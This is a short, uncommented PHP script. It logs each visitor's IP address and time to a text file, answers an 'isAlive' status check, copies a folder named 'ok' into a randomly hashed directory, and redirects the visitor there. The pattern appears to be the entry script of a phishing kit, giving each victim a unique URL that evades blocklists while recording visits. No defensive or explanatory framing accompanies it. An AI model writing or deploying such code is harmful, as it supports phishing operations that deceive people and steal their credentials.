<?php

if(isset($_GET["isAlive"])){
echo "ok";
die;
}

$ip = $_SERVER['REMOTE_ADDR'];
$mydate=getdate(date("U"));
$lin = "Ip : $ip @ $mydate[weekday], $mydate[month] $mydate[mday], $mydate[year]   $mydate[hours]:$mydate[minutes]:$mydate[seconds]\r\n".PHP_EOL;
file_put_contents("vu.txt", $lin, FILE_APPEND);


$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="ok";
recurse_copy( $src, $dst );
header("location:$dst");


?>